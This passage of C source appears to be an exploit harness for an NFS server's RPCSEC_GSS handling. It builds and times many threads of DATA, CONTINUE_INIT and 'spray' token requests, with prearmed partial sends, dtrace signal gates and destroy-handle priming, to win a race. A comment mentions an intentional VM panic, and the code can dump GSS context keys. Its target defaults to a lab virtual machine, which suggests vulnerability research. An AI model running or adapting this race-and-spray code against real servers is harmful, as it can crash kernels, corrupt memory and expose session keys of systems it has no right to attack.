        (unsigned long long)monotonic_ns(),
        worker->ordinal, worker->delay_us,
        worker->request->kind, worker->request->nfs_proc,
        worker->request->gss_proc, worker->request->token_length,
        send_result);
    fflush(stdout);
    if (worker->signal_data_sent) {
        atomic_store_explicit(worker->data_sent, true,
            memory_order_release);
    }

    if (worker->data_reply_prefix != NULL &&
        strcmp(worker->request->kind, "data") == 0) {
        int path_length = snprintf(data_reply_path, sizeof(data_reply_path),
            "%s.%u.bin", worker->data_reply_prefix, worker->ordinal);

        if (path_length < 0 || (size_t)path_length >= sizeof(data_reply_path)) {
            worker->result = -1;
            goto report_result;
        }
        all_data_reply_path = data_reply_path;
    }
    if (send_result < 0 || read_record(fd, &reply, &reply_length) < 0) {
        worker->result = -1;
    } else if (worker->reply_path != NULL &&
        write_blob_atomic(worker->reply_path, reply, reply_length) < 0) {
        worker->result = -1;
    } else if (all_data_reply_path != NULL &&
        write_blob_atomic(all_data_reply_path, reply, reply_length) < 0) {
        worker->result = -1;
    } else {
        worker->result = 0;
    }
report_result:
    printf("race_request_result ordinal=%u kind=%s result=%d "
        "reply_len=%zu\n", worker->ordinal, worker->request->kind,
        worker->result, reply_length);
    fflush(stdout);
out:
    if (fd >= 0) {
        close(fd);
    }
    free(prime_wire);
    free(prime_reply);
    free(reply);
    return NULL;
}

static int
run_crypto_race(const char *host, gss_ctx_id_t context, uint32_t handle,
    uint32_t prime_destroy_handle,
    const uint8_t *initial_token, size_t initial_token_length,
    unsigned data_count, unsigned continue_count, unsigned data_delay_us,
    unsigned data_stagger_us, const unsigned *data_delay_schedule,
    bool duplicate_data,
    unsigned continue_delay_us,
    const uint8_t *spray_token,
    size_t spray_token_length, uint8_t *const *spray_tokens,
    const size_t *spray_token_lengths, unsigned spray_count,
    unsigned spray_delay_us, unsigned spray_stagger_us,
    size_t plaintext_length, uint32_t xid_base,
    uint32_t data_sequence_start, const char *prearm_wait_file,
    const char *data_wait_file, const char *continue_wait_file,
    const char *spray_wait_file,
    const char *data_reply_file, const char *data_reply_prefix,
    const char *continue_reply_file,
    bool second_data_dtrace_gate)
{
    unsigned total = data_count + continue_count + spray_count;
    struct prepared_request *requests = NULL;
    struct race_worker *workers = NULL;
    pthread_t *threads = NULL;
    atomic_uint ready;
    atomic_bool go;
    atomic_ullong go_ns;
    atomic_bool data_sent;
    bool continue_after_data = continue_wait_file != NULL &&
        strcmp(continue_wait_file, "data_sent") == 0;
    unsigned created = 0;
    unsigned replies = 0;
    int result = -1;

    if (total == 0 || total > 512 ||
        (continue_after_data && data_count == 0) ||
        data_sequence_start == 0 ||
        (!duplicate_data && data_count != 0 &&
        data_sequence_start > UINT32_MAX - (data_count - 1U))) {
        return -1;
    }
    if (spray_count != 0 && spray_tokens == NULL &&
        (spray_token == NULL || spray_token_length == 0)) {
        return -1;
    }
    requests = calloc(total, sizeof(*requests));
    workers = calloc(total, sizeof(*workers));
    threads = calloc(total, sizeof(*threads));
    if (requests == NULL || workers == NULL || threads == NULL) {
        goto out;
    }

    for (unsigned i = 0; i < data_count; i++) {
        requests[i].wire = build_data_request(context, handle,
            data_sequence_start + (duplicate_data ? 0 : i),
            xid_base + (duplicate_data ? 0 : i), plaintext_length,
            &requests[i].length);
        if (requests[i].wire == NULL) {
            goto out;
        }
        requests[i].kind = "data";
        requests[i].nfs_proc = nfs_data_request.procedure;
        requests[i].gss_proc = RPCSEC_GSS_DATA;
    }
    for (unsigned i = 0; i < continue_count; i++) {
        unsigned index = data_count + i;

        requests[index].wire = build_continue_request(handle, initial_token,
            initial_token_length, xid_base + index, &requests[index].length);
        if (requests[index].wire == NULL) {
            goto out;
        }
        requests[index].kind = "continue";
        requests[index].nfs_proc = NFS_NULL;
        requests[index].gss_proc = RPCSEC_GSS_CONTINUE_INIT;
        requests[index].token_length = initial_token_length;
        printf("prepared_continue index=%u nfs_proc=%u gss_proc=%u "
            "token_len=%zu handle=%08x wire_len=%zu\n",
            i, requests[index].nfs_proc, requests[index].gss_proc,
            requests[index].token_length, handle, requests[index].length);
        fflush(stdout);
    }
    for (unsigned i = 0; i < spray_count; i++) {
        unsigned index = data_count + continue_count + i;
        const uint8_t *token = spray_tokens != NULL ?
            spray_tokens[i] : spray_token;
        size_t token_length = spray_tokens != NULL ?
            spray_token_lengths[i] : spray_token_length;

        if (token == NULL || token_length == 0) {
            goto out;
        }
        requests[index].wire = build_continue_request(handle, token,
            token_length, xid_base + index, &requests[index].length);
        if (requests[index].wire == NULL) {
            goto out;
        }
        requests[index].kind = "spray";
        requests[index].nfs_proc = NFS_NULL;
        requests[index].gss_proc = RPCSEC_GSS_CONTINUE_INIT;
        requests[index].token_length = token_length;
    }

    atomic_init(&ready, 0);
    atomic_init(&go, false);
    atomic_init(&go_ns, 0);
    atomic_init(&data_sent, false);
    for (unsigned i = 0; i < total; i++) {
        workers[i] = (struct race_worker){
            .host = host,
            .request = &requests[i],
            .ready = &ready,
            .go = &go,
            .go_ns = &go_ns,
            .data_sent = &data_sent,
            .signal_data_sent = continue_after_data && i == 0,
            .wait_for_data_sent = continue_after_data &&
                i >= data_count && i < data_count + continue_count,
            .wait_file = i < data_count && i == 1 &&
                second_data_dtrace_gate ?
                "dtrace_second_data_signal" :
                (i < data_count ? data_wait_file :
                (i < data_count + continue_count ?
                (continue_after_data ? NULL : continue_wait_file) :
                spray_wait_file)),
            .reply_path = i == 0 && data_count != 0 ? data_reply_file :
                (i == data_count ? continue_reply_file : NULL),
            .data_reply_prefix = data_reply_prefix,
            .ordinal = i,
            .delay_us = i < data_count && i == 1 &&
                second_data_dtrace_gate ? 0 :
                (i < data_count ?
                (data_delay_schedule != NULL ? data_delay_schedule[i] :
                data_delay_us + i * data_stagger_us) :
                (i < data_count + continue_count ?
                continue_delay_us : spray_delay_us +
                (i - data_count - continue_count) * spray_stagger_us)),
            .prime_destroy_handle =
                i == 0 && i < data_count ? prime_destroy_handle : 0,
            .prime_destroy_xid = xid_base ^ 0x40000000U,
            .result = -1,
        };
        if (pthread_create(&threads[i], NULL, run_race_worker,
            &workers[i]) != 0) {
            goto release_workers;
        }
        created++;
    }

    while (atomic_load_explicit(&ready, memory_order_acquire) != total) {
        usleep(100);
    }
    if (prearm_wait_file != NULL && prearm_wait_file[0] != '\0') {
        if (strcmp(prearm_wait_file, "signal") == 0) {
            sigset_t set;
            int signal_number;

            sigemptyset(&set);
            sigaddset(&set, SIGUSR1);
            printf("race_prearmed_waiting signal=SIGUSR1 handle=%08x\n",
                handle);
            fflush(stdout);
            if (sigwait(&set, &signal_number) != 0 ||
                signal_number != SIGUSR1) {
                fprintf(stderr, "failed waiting for SIGUSR1\n");
                goto release_workers;
            }
        } else {
            unsigned long polls;

            printf("race_prearmed_waiting file=%s handle=%08x\n",
                prearm_wait_file, handle);
            fflush(stdout);
            for (polls = 0; polls < 1200000UL; polls++) {
                if (access(prearm_wait_file, F_OK) == 0) {
                    break;
                }
                usleep(100);
            }
            if (polls == 1200000UL) {
                fprintf(stderr,
                    "timed out waiting for prearmed race file: %s\n",
                    prearm_wait_file);
                goto release_workers;
            }
        }
        printf("race_prearmed handle=%08x\n", handle);
        fflush(stdout);
    }
    atomic_store_explicit(&go_ns, monotonic_ns(), memory_order_release);
    atomic_store_explicit(&go, true, memory_order_release);
    for (unsigned i = 0; i < created; i++) {
        pthread_join(threads[i], NULL);
        if (workers[i].result == 0) {
            replies++;
        }
    }
    created = 0;
    printf("crypto_race data=%u duplicate_data=%d continue=%u data_delay_us=%u "
        "data_stagger_us=%u continue_delay_us=%u spray=%u spray_delay_us=%u "
        "spray_stagger_us=%u plaintext=%zu prime_destroy=%08x "
        "replies=%u interrupted=%u\n",
        data_count, duplicate_data, continue_count, data_delay_us,
        data_stagger_us,
        continue_delay_us,
        spray_count, spray_delay_us, spray_stagger_us,
        plaintext_length, prime_destroy_handle, replies,
        total - replies);
    result = 0;
    goto out;

release_workers:
    atomic_store_explicit(&go, true, memory_order_release);
    for (unsigned i = 0; i < created; i++) {
        pthread_join(threads[i], NULL);
    }
    created = 0;

out:
    for (unsigned i = 0; i < total; i++) {
        free(requests != NULL ? requests[i].wire : NULL);
    }
    free(requests);
    free(workers);
    free(threads);
    return result;
}

static int
send_privacy_null(const char *host, gss_ctx_id_t context, uint32_t handle,
    uint32_t sequence, uint32_t xid)
{
    uint8_t header[56];
    uint8_t *cursor = header;
    uint32_t network_sequence = htonl(sequence);
    gss_buffer_desc header_buffer = {
        .length = sizeof(header),
        .value = header,
    };
    gss_buffer_desc plaintext = {
        .length = sizeof(network_sequence),
        .value = &network_sequence,
    };
    gss_buffer_desc mic = GSS_C_EMPTY_BUFFER;
    gss_buffer_desc wrapped = GSS_C_EMPTY_BUFFER;
    OM_uint32 major;
    OM_uint32 minor = 0;
    int confidential = 0;
    size_t mic_padded;
    size_t wrapped_padded;
    size_t body_length;
    size_t wire_length;
    uint8_t *wire = NULL;
    uint8_t *reply = NULL;
    size_t reply_length = 0;
    int fd = -1;
    int result = -1;

    put_u32(&cursor, xid);
    put_u32(&cursor, RPC_CALL);
    put_u32(&cursor, RPC_VERSION);
    put_u32(&cursor, NFS_PROGRAM);
    put_u32(&cursor, NFS_VERSION);
    put_u32(&cursor, NFS_NULL);
    put_u32(&cursor, RPCSEC_GSS);
    put_u32(&cursor, 24);
    put_u32(&cursor, RPCSEC_GSS_VERSION);
    put_u32(&cursor, RPCSEC_GSS_DATA);
    put_u32(&cursor, sequence);
    put_u32(&cursor, RPCSEC_GSS_SVC_PRIVACY);
    put_u32(&cursor, sizeof(handle));
    put_u32(&cursor, handle);
    if ((size_t)(cursor - header) != sizeof(header)) {
        goto out;
    }

    major = gss_get_mic(&minor, context, GSS_C_QOP_DEFAULT,
        &header_buffer, &mic);
    if (major != GSS_S_COMPLETE) {
        print_status("gss_get_mic", major, minor);
        goto out;
    }
    major = gss_wrap(&minor, context, 1, GSS_C_QOP_DEFAULT,
        &plaintext, &confidential, &wrapped);
    if (major != GSS_S_COMPLETE || !confidential) {
        print_status("gss_wrap", major, minor);
        goto out;
    }

    mic_padded = (mic.length + 3U) & ~3U;
    wrapped_padded = (wrapped.length + 3U) & ~3U;
    body_length = sizeof(header) + 8U + mic_padded + 4U + wrapped_padded;
    if (mic.length > UINT32_MAX || wrapped.length > UINT32_MAX ||
        body_length > UINT32_MAX) {
        goto out;
    }
    wire_length = 4U + body_length;
    wire = calloc(1, wire_length);
    if (wire == NULL) {
        goto out;
    }
    cursor = wire;
    put_u32(&cursor, 0x80000000U | (uint32_t)body_length);
    memcpy(cursor, header, sizeof(header));
    cursor += sizeof(header);
    put_u32(&cursor, RPCSEC_GSS);
    put_u32(&cursor, (uint32_t)mic.length);
    memcpy(cursor, mic.value, mic.length);
    cursor += mic_padded;
    put_u32(&cursor, (uint32_t)wrapped.length);
    memcpy(cursor, wrapped.value, wrapped.length);

    fd = connect_server(host);
    if (fd < 0 || send_all(fd, wire, wire_length) < 0 ||
        read_record(fd, &reply, &reply_length) < 0) {
        goto out;
    }
    if (reply_length >= 12U) {
        const uint8_t *reply_cursor = reply;
        size_t remaining = reply_length;
        uint32_t reply_xid;
        uint32_t reply_type;
        uint32_t reply_status;

        if (get_u32(&reply_cursor, &remaining, &reply_xid) == 0 &&
            get_u32(&reply_cursor, &remaining, &reply_type) == 0 &&
            get_u32(&reply_cursor, &remaining, &reply_status) == 0 &&
            reply_xid == xid && reply_type == 1 && reply_status == 0) {
            result = 0;
        }
    }

out:
    if (fd >= 0) {
        close(fd);
    }
    free(wire);
    free(reply);
    if (mic.length != 0) {
        gss_release_buffer(&minor, &mic);
    }
    if (wrapped.length != 0) {
        gss_release_buffer(&minor, &wrapped);
    }
    return result;
}

int
main(int argc, char **argv)
{
    const char *race_wait_file = getenv("RPC_GSS_RACE_WAIT_FILE");
    const char *prearm_wait_file = getenv("RPC_GSS_PREARM_WAIT_FILE");
    const char *prearm_initial_file =
        getenv("RPC_GSS_PREARM_INITIAL_FILE");
    const char *continue_token_file =
        getenv("RPC_GSS_CONTINUE_TOKEN_FILE");
    const char *continue_zero_token_env =
        getenv("RPC_GSS_CONTINUE_ZERO_TOKEN");
    const char *reload_tokens_after_gate_env =
        getenv("RPC_GSS_RELOAD_TOKENS_AFTER_GATE");
    const char *data_wait_file = getenv("RPC_GSS_DATA_WAIT_FILE");
    const char *continue_wait_file =
        getenv("RPC_GSS_CONTINUE_WAIT_FILE");
    const char *data_delay_env = getenv("RPC_GSS_DATA_DELAY_US");
    const char *data_stagger_env = getenv("RPC_GSS_DATA_STAGGER_US");
    const char *data_delay_schedule_env =
        getenv("RPC_GSS_DATA_DELAY_SCHEDULE");
    const char *second_data_dtrace_gate_env =
        getenv("RPC_GSS_SECOND_DATA_DTRACE_GATE");
    const char *duplicate_data_env =
        getenv("RPC_GSS_DUPLICATE_DATA");
    const char *data_sequence_env = getenv("RPC_GSS_DATA_SEQUENCE");
    const char *data_sequence_file =
        getenv("RPC_GSS_DATA_SEQUENCE_FILE");
    const char *spray_token_file = getenv("RPC_GSS_SPRAY_TOKEN_FILE");
    const char *spray_token_prefix =
        getenv("RPC_GSS_SPRAY_TOKEN_PREFIX");
    const char *spray_count_env = getenv("RPC_GSS_SPRAY_COUNT");
    const char *spray_delay_env = getenv("RPC_GSS_SPRAY_DELAY_US");
    const char *spray_stagger_env =
        getenv("RPC_GSS_SPRAY_STAGGER_US");
    const char *spray_wait_file =
        getenv("RPC_GSS_SPRAY_WAIT_FILE");
    const char *lucid_output_file = getenv("RPC_GSS_EXPORT_LUCID_FILE");
    const char *context_key_output_file =
        getenv("RPC_GSS_INQUIRE_KEY_FILE");
    const char *external_reply_file =
        getenv("RPC_GSS_EXTERNAL_REPLY_FILE");
    const char *capture_continue_reply_file =
        getenv("RPC_GSS_CAPTURE_CONTINUE_REPLY_FILE");
    const char *capture_data_reply_file =
        getenv("RPC_GSS_CAPTURE_DATA_REPLY_FILE");
    const char *capture_all_data_reply_prefix =
        getenv("RPC_GSS_CAPTURE_ALL_DATA_REPLY_PREFIX");
    const char *prime_destroy_handle_env =
        getenv("RPC_GSS_PRIME_DESTROY_HANDLE");
    const char *nfs_filehandle_file = getenv("RPC_GSS_NFS_FH_FILE");
    const char *nfs_procedure = getenv("RPC_GSS_NFS_PROC");
    const char *data_service_env = getenv("RPC_GSS_DATA_SERVICE");
    const char *nfs_readdirplus_dircount =
        getenv("RPC_GSS_NFS_READDIRPLUS_DIRCOUNT");
    const char *nfs_readdirplus_maxcount =
        getenv("RPC_GSS_NFS_READDIRPLUS_MAXCOUNT");
    const char *no_mutual_env = getenv("RPC_GSS_NO_MUTUAL");
    const char *token_only_env = getenv("RPC_GSS_TOKEN_ONLY");
    const char *host = argc > 1 ? argv[1] : "192.168.64.81";
    const char *service = argc > 2 ? argv[2] :
        "nfs@tests-virtual-machine.local";
    gss_buffer_desc name_buffer = {
        .length = strlen(service),
        .value = (void *)service,
    };
    gss_buffer_desc input_token = GSS_C_EMPTY_BUFFER;
    gss_buffer_desc output_token = GSS_C_EMPTY_BUFFER;
    gss_name_t target = GSS_C_NO_NAME;
    gss_ctx_id_t context = GSS_C_NO_CONTEXT;
    OM_uint32 major;
    OM_uint32 minor = 0;
    OM_uint32 returned_flags = 0;
    OM_uint32 requested_flags =
        GSS_C_REPLAY_FLAG | GSS_C_SEQUENCE_FLAG;
    uint8_t *request = NULL;
    size_t request_length = 0;
    uint8_t *reply = NULL;
    size_t reply_length = 0;
    const uint8_t *cursor;
    size_t remaining;
    uint32_t xid = 0x4e465343U;
    uint32_t word;
    uint32_t verifier_length;
    const uint8_t *server_verifier = NULL;
    uint32_t handle_length;
    uint32_t handle;
    uint32_t server_major;
    uint32_t server_minor;
    uint32_t seq_window;
    uint32_t server_token_length;
    unsigned long privacy_count = 0;
    unsigned long race_data_count = 0;
    unsigned long race_continue_count = 0;
    unsigned long race_data_delay_us = 0;
    unsigned long race_data_stagger_us = 0;
    unsigned race_data_delays[MAX_RACE_REQUESTS];
    const unsigned *race_data_delay_schedule = NULL;
    unsigned long race_continue_delay_us = 250;
    unsigned long race_spray_count = 0;
    unsigned long race_spray_delay_us = 0;
    unsigned long race_spray_stagger_us = 0;
    unsigned long race_plaintext_length =
        DEFAULT_RACE_PRIVACY_PLAINTEXT_LENGTH;
    uint32_t race_data_sequence = 1;
    uint32_t prime_destroy_handle = 0;
    uint8_t *initial_token_copy = NULL;
    size_t initial_token_length = 0;
    uint8_t *alternate_continue_token = NULL;
    size_t alternate_continue_token_length = 0;
    bool continue_zero_token = false;
    bool duplicate_data = false;
    bool reload_tokens_after_gate = false;
    bool second_data_dtrace_gate = false;
    uint8_t *spray_token = NULL;
    size_t spray_token_length = 0;
    uint8_t **spray_tokens = NULL;
    size_t *spray_token_lengths = NULL;
    int fd = -1;
    int result = 1;

    signal(SIGPIPE, SIG_IGN);
    printf("client_pid=%d\n", getpid());
    fflush(stdout);
    if (data_service_env == NULL || data_service_env[0] == '\0' ||
        strcmp(data_service_env, "privacy") == 0) {
        rpcsec_data_service = RPCSEC_GSS_SVC_PRIVACY;
    } else if (strcmp(data_service_env, "integrity") == 0) {
        rpcsec_data_service = RPCSEC_GSS_SVC_INTEGRITY;
    } else {
        fprintf(stderr, "invalid RPC_GSS_DATA_SERVICE: %s\n",
            data_service_env);
        goto out;
    }
    printf("rpcsec_data_service=%s\n",
        rpcsec_data_service == RPCSEC_GSS_SVC_INTEGRITY ?
        "integrity" : "privacy");
    fflush(stdout);
    if (configure_nfs_data_request(nfs_filehandle_file, nfs_procedure,
        nfs_readdirplus_dircount, nfs_readdirplus_maxcount) < 0) {
        perror("configure NFS data request");
        goto out;
    }
    if (nfs_data_request.filehandle_length != 0) {
        printf("nfs_data_proc=%u fh_len=%u dircount=%u maxcount=%u\n",
            nfs_data_request.procedure,
            nfs_data_request.filehandle_length,
            nfs_data_request.readdirplus_dircount,
            nfs_data_request.readdirplus_maxcount);
        fflush(stdout);
    }
    if (second_data_dtrace_gate_env != NULL &&
        second_data_dtrace_gate_env[0] != '\0') {
        if (strcmp(second_data_dtrace_gate_env, "1") != 0) {
            fprintf(stderr, "invalid RPC_GSS_SECOND_DATA_DTRACE_GATE: %s\n",
                second_data_dtrace_gate_env);
            goto out;
        }
        second_data_dtrace_gate = true;
        if (signal(SIGURG, handle_dtrace_second_data_release) == SIG_ERR) {
            perror("signal SIGURG");
            goto out;
        }
        printf("second_data_dtrace_gate=1\n");
        fflush(stdout);
    }
    if (continue_wait_file != NULL &&
        strcmp(continue_wait_file, "dtrace_continue_signal") == 0) {
        if (signal(SIGIO, handle_dtrace_continue_release) == SIG_ERR) {
            perror("signal SIGIO");
            goto out;
        }
    }
    if ((continue_wait_file != NULL &&
        strcmp(continue_wait_file, "dtrace_signal") == 0)) {
        if (signal(SIGUSR1, handle_dtrace_release) == SIG_ERR) {
            perror("signal SIGUSR1");
            goto out;
        }
    }
    if (data_wait_file != NULL &&
        strcmp(data_wait_file, "dtrace_data_signal") == 0) {
        if (signal(SIGWINCH, handle_dtrace_data_release) == SIG_ERR) {
            perror("signal SIGWINCH");
            goto out;
        }
    }
    if (spray_wait_file != NULL &&
        strcmp(spray_wait_file, "dtrace_signal2") == 0) {
        if (signal(SIGUSR2, handle_dtrace_repair_release) == SIG_ERR) {
            perror("signal SIGUSR2");
            goto out;
        }
        if (signal(SIGALRM, handle_dtrace_spray_stop) == SIG_ERR) {
            perror("signal SIGALRM");
            goto out;
        }
    }
    if (prearm_wait_file != NULL &&
        strcmp(prearm_wait_file, "signal") == 0) {
        sigset_t set;

        sigemptyset(&set);
        sigaddset(&set, SIGUSR1);
        if (sigprocmask(SIG_BLOCK, &set, NULL) < 0) {
            perror("sigprocmask SIGUSR1");
            goto out;
        }
    }

    if (no_mutual_env == NULL || no_mutual_env[0] == '\0' ||
        strcmp(no_mutual_env, "0") == 0) {
        requested_flags |= GSS_C_MUTUAL_FLAG;
    }

    major = gss_import_name(&minor, &name_buffer,
        GSS_C_NT_HOSTBASED_SERVICE, &target);
    if (major != GSS_S_COMPLETE) {
        print_status("gss_import_name", major, minor);
        goto out;
    }
    major = gss_init_sec_context(&minor, GSS_C_NO_CREDENTIAL, &context,
        target, GSS_C_NO_OID,
        requested_flags,
        0, GSS_C_NO_CHANNEL_BINDINGS, &input_token, NULL, &output_token,
        &returned_flags, NULL);
    if (major != GSS_S_COMPLETE && major != GSS_S_CONTINUE_NEEDED) {
        print_status("gss_init_sec_context(initial)", major, minor);
        goto out;
    }
    initial_token_copy = malloc(output_token.length);
    if (initial_token_copy == NULL) {
        goto out;
    }
    memcpy(initial_token_copy, output_token.value, output_token.length);
    initial_token_length = output_token.length;
    if (argc > 3 &&
        write_blob(argv[3], output_token.value, output_token.length) < 0) {
        perror("write initial token");
        goto out;
    }
    if (major == GSS_S_COMPLETE &&
        (external_reply_file == NULL || external_reply_file[0] == '\0') &&
        lucid_output_file != NULL && lucid_output_file[0] != '\0') {
        if (export_lucid_context(lucid_output_file, &context) < 0) {
            goto out;
        }
        if (token_only_env != NULL && token_only_env[0] != '\0' &&
            strcmp(token_only_env, "0") != 0) {
            result = 0;
            goto out;
        }
    }
    if (external_reply_file != NULL && external_reply_file[0] != '\0') {
        uint8_t *external_reply = NULL;
        size_t external_reply_length = 0;
        const uint8_t *external_cursor;
        size_t external_remaining;
        uint32_t external_word;
        uint32_t external_verifier_length;
        uint32_t external_handle_length;
        uint32_t external_token_length;
        unsigned long polls;

        printf("external_reply_waiting file=%s\n", external_reply_file);
        fflush(stdout);
        for (polls = 0; polls < 1200000UL; polls++) {
            if (access(external_reply_file, F_OK) == 0) {
                break;
            }
            usleep(100);
        }
        if (polls == 1200000UL ||
            read_blob(external_reply_file, &external_reply,
            &external_reply_length) < 0) {
            perror("read external CONTINUE reply");
            free(external_reply);
            goto out;
        }
        external_cursor = external_reply;
        external_remaining = external_reply_length;
        if (get_u32(&external_cursor, &external_remaining,
                &external_word) < 0 ||
            get_u32(&external_cursor, &external_remaining,
                &external_word) < 0 || external_word != 1 ||
            get_u32(&external_cursor, &external_remaining,
                &external_word) < 0 || external_word != 0 ||
            get_u32(&external_cursor, &external_remaining,
                &external_word) < 0 ||
            get_u32(&external_cursor, &external_remaining,
                &external_verifier_length) < 0 ||
            skip_opaque(&external_cursor, &external_remaining,
                external_verifier_length) < 0 ||
            get_u32(&external_cursor, &external_remaining,
                &external_word) < 0 || external_word != 0 ||
            get_u32(&external_cursor, &external_remaining,
                &external_handle_length) < 0 ||
            skip_opaque(&external_cursor, &external_remaining,
                external_handle_length) < 0 ||
            get_u32(&external_cursor, &external_remaining,
                &external_word) < 0 || external_word != GSS_S_COMPLETE ||
            get_u32(&external_cursor, &external_remaining,
                &external_word) < 0 ||
            get_u32(&external_cursor, &external_remaining,
                &external_word) < 0 ||
            get_u32(&external_cursor, &external_remaining,
                &external_token_length) < 0 ||
            external_token_length > external_remaining) {
            fprintf(stderr, "malformed external CONTINUE reply (%zu bytes)\n",
                external_reply_length);
            free(external_reply);
            goto out;
        }
        if (output_token.length != 0) {
            gss_release_buffer(&minor, &output_token);
            output_token = (gss_buffer_desc){0, NULL};
        }
        input_token.length = external_token_length;
        input_token.value = (void *)external_cursor;
        major = gss_init_sec_context(&minor, GSS_C_NO_CREDENTIAL, &context,
            target, GSS_C_NO_OID,
            requested_flags,
            0, GSS_C_NO_CHANNEL_BINDINGS, &input_token, NULL, &output_token,
            &returned_flags, NULL);
        input_token = (gss_buffer_desc){0, NULL};
        free(external_reply);
        if (major != GSS_S_COMPLETE) {
            print_status("gss_init_sec_context(external final)",
                major, minor);
            goto out;
        }
        if (lucid_output_file == NULL || lucid_output_file[0] == '\0' ||
            export_lucid_context(lucid_output_file, &context) < 0) {
            goto out;
        }
        result = 0;
        goto out;
    }

    request = build_init_request(&output_token, xid, &request_length);
    if (request == NULL) {
        goto out;
    }
    fd = connect_server(host);
    if (fd < 0) {
        perror("RPCSEC_GSS INIT connect");
        goto out;
    }
    if (prearm_initial_file != NULL && prearm_initial_file[0] != '\0') {
        unsigned long polls;

        if (request_length <= 1 ||
            send_all(fd, request, request_length - 1) < 0) {
            perror("RPCSEC_GSS INIT prearm");
            goto out;
        }
        printf("initial_prearmed_waiting file=%s\n",
            prearm_initial_file);
        fflush(stdout);
        for (polls = 0; polls < 1200000UL; polls++) {
            if (access(prearm_initial_file, F_OK) == 0) {
                break;
            }
            usleep(100);
        }
        if (polls == 1200000UL) {
            fprintf(stderr, "timed out waiting for prearmed INIT file: %s\n",
                prearm_initial_file);
            goto out;
        }
        printf("initial_prearmed\n");
        fflush(stdout);
        if (send_all(fd, request + request_length - 1, 1) < 0) {
            perror("RPCSEC_GSS INIT release");
            goto out;
        }
    } else if (send_all(fd, request, request_length) < 0) {
        perror("RPCSEC_GSS INIT send");
        goto out;
    }
    if (read_record(fd, &reply, &reply_length) < 0) {
        perror("RPCSEC_GSS INIT");
        goto out;
    }

    cursor = reply;
    remaining = reply_length;
    if (get_u32(&cursor, &remaining, &word) < 0 || word != xid ||
        get_u32(&cursor, &remaining, &word) < 0 || word != 1 ||
        get_u32(&cursor, &remaining, &word) < 0 || word != 0 ||
        get_u32(&cursor, &remaining, &word) < 0 ||
        get_u32(&cursor, &remaining, &verifier_length) < 0) {
        fprintf(stderr, "malformed RPCSEC_GSS INIT reply (%zu bytes)\n",
            reply_length);
        goto out;
    }
    server_verifier = cursor;
    if (skip_opaque(&cursor, &remaining, verifier_length) < 0 ||
        get_u32(&cursor, &remaining, &word) < 0 || word != 0 ||
        get_u32(&cursor, &remaining, &handle_length) < 0 ||
        handle_length != sizeof(handle) || remaining < sizeof(handle)) {
        fprintf(stderr, "malformed RPCSEC_GSS INIT reply (%zu bytes)\n",
            reply_length);
        goto out;
    }
    memcpy(&handle, cursor, sizeof(handle));
    cursor += sizeof(handle);
    remaining -= sizeof(handle);
    handle = ntohl(handle);
    if (get_u32(&cursor, &remaining, &server_major) < 0 ||
        get_u32(&cursor, &remaining, &server_minor) < 0 ||
        get_u32(&cursor, &remaining, &seq_window) < 0 ||
        get_u32(&cursor, &remaining, &server_token_length) < 0 ||
        server_token_length > remaining) {
        fprintf(stderr, "truncated RPCSEC_GSS INIT result\n");
        goto out;
    }

    printf("handle=%08x server_major=0x%08x server_minor=0x%08x "
        "seq_window=%u token_len=%u initial_major=0x%08x\n",
        handle, server_major, server_minor, seq_window,
        server_token_length, major);
    if (verifier_length >= 16 &&
        server_verifier[0] == 0x04 && server_verifier[1] == 0x04) {
        uint64_t server_snd_seq = get_be64(server_verifier + 8);
        uint8_t next_server_mic_header[16];

        printf("server_mic_header=");
        for (unsigned index = 0; index < 16; index++) {
            printf("%02x", server_verifier[index]);
        }
        printf(" snd_seq=%llu next_snd_seq=%llu\n",
            (unsigned long long)server_snd_seq,
            (unsigned long long)(server_snd_seq + 1U));
        memcpy(next_server_mic_header, server_verifier,
            sizeof(next_server_mic_header));
        put_be64(next_server_mic_header + 8, server_snd_seq + 1U);
        printf("next_server_mic_header=");
        for (unsigned index = 0;
            index < sizeof(next_server_mic_header); index++) {
            printf("%02x", next_server_mic_header[index]);
        }
        printf("\n");
    }
    fflush(stdout);
    /* Keep the context sequence evidence across an intentional VM panic. */
    if (fsync(STDOUT_FILENO) != 0) {
        perror("fsync context log");
        goto out;
    }
    sync();
    if (argc > 4 &&
        write_blob(argv[4], cursor, server_token_length) < 0) {
        perror("write server token");
        goto out;
    }
    if (output_token.length != 0) {
        gss_release_buffer(&minor, &output_token);
        output_token = (gss_buffer_desc){0, NULL};
    }
    input_token.length = server_token_length;
    input_token.value = (void *)cursor;
    major = gss_init_sec_context(&minor, GSS_C_NO_CREDENTIAL, &context,
        target, GSS_C_NO_OID,
        requested_flags,
        0, GSS_C_NO_CHANNEL_BINDINGS, &input_token, NULL, &output_token,
        &returned_flags, NULL);
    input_token = (gss_buffer_desc){0, NULL};
    if (major != GSS_S_COMPLETE) {
        print_status("gss_init_sec_context(final)", major, minor);
        goto out;
    }
    if (context_key_output_file != NULL &&
        context_key_output_file[0] != '\0' &&
        dump_context_keys(context_key_output_file, context) < 0) {
        goto out;
    }
    if (lucid_output_file != NULL && lucid_output_file[0] != '\0' &&
        export_lucid_context(lucid_output_file, &context) < 0) {
        goto out;
    }
    if (argc > 5) {
        char *end = NULL;

        privacy_count = strtoul(argv[5], &end, 0);
        if (argv[5][0] == '\0' || end == NULL || *end != '\0' ||
            privacy_count > 1000000UL) {
            fprintf(stderr, "invalid privacy count: %s\n", argv[5]);
            goto out;
        }
    }
    if (argc > 6) {
        char *end = NULL;

        race_data_count = strtoul(argv[6], &end, 0);
        if (argv[6][0] == '\0' || end == NULL || *end != '\0' ||
            race_data_count > 512UL) {
            fprintf(stderr, "invalid race data count: %s\n", argv[6]);
            goto out;
        }
    }
    if (argc > 7) {
        char *end = NULL;

        race_continue_count = strtoul(argv[7], &end, 0);
        if (argv[7][0] == '\0' || end == NULL || *end != '\0' ||
            race_continue_count > 512UL ||
            race_data_count + race_continue_count > 512UL) {
            fprintf(stderr, "invalid race continue count: %s\n", argv[7]);
            goto out;
        }
    }
    if (argc > 8) {
        char *end = NULL;

        race_continue_delay_us = strtoul(argv[8], &end, 0);
        if (argv[8][0] == '\0' || end == NULL || *end != '\0' ||
            race_continue_delay_us > 1000000UL) {
            fprintf(stderr, "invalid race continue delay: %s\n", argv[8]);
            goto out;
        }
    }
    if (argc > 9) {
        char *end = NULL;

        race_plaintext_length = strtoul(argv[9], &end, 0);
        if (argv[9][0] == '\0' || end == NULL || *end != '\0' ||
            race_plaintext_length < 8UL ||
            race_plaintext_length > MAX_RACE_PRIVACY_PLAINTEXT_LENGTH) {
